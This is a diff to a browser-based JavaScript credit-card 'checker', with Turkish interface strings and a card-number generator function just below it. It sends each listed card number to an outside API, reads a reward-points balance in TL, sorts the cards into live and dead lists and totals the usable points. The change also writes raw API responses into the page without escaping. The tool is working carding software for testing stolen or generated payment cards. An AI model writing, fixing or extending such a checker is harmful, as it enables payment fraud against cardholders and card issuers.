@@ -217,7 +217,9 @@ function extractPuan(text){
 }
 
 /* CHECKER ANA KOD */
+    
 async function startCheck(){
+
     const btn = document.getElementById("startBtn");
     btn.disabled = true;
     btn.innerText = "⏳ Bekle kanks…";
@@ -230,38 +232,53 @@ async function startCheck(){
 
     liveList.innerHTML = "";
     deadList.innerHTML = "";
+    totalPuanBox.innerText = "0";
 
     let toplam = 0;
 
     for(const card of cards){
+
         if(!card.trim()) continue;
 
-        const response = await fetch("https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=" + card);
-        const t = await r.text();
+        const response = await fetch(
+            "https://oxyincxapi.alwaysdata.net/check/ownerapi.php?kart=" + encodeURIComponent(card)
+        );
 
-        const puan = extractPuan(t);
+        const text = await response.text();
+
+        const puanMatch = text.match(/Puan[: ]+([0-9.,]+)\s*TL/i);
+        let puan = 0;
+
+        if(puanMatch){
+            puan = parseFloat(puanMatch[1].replace(",", "."));
+        }
 
         if(puan > 0){
             toplam += puan;
+
             liveList.innerHTML += `
-            <div class="live-item">
-                <b>${card}</b><br>
-                Puan: ${puan}
-            </div>`;
+                <div class="live-item">
+                    <b>${card}</b><br>
+                    ${text}
+                </div>
+            `;
         } else {
             deadList.innerHTML += `
-            <div class="dead-item">
-                <b>${card}</b><br>
-                DEAD / API ERROR
-            </div>`;
+                <div class="dead-item">
+                    <b>${card}</b><br>
+                    ${text}
+                </div>
+            `;
         }
+
     }
 
-    totalPuanBox.innerText = toplam;
+    totalPuanBox.innerText = toplam.toFixed(2) + " TL";
 
     btn.disabled = false;
     btn.innerText = "Kontrol Başlat";
 }
+
 
 /* GENERATOR */
 function generateCC(){
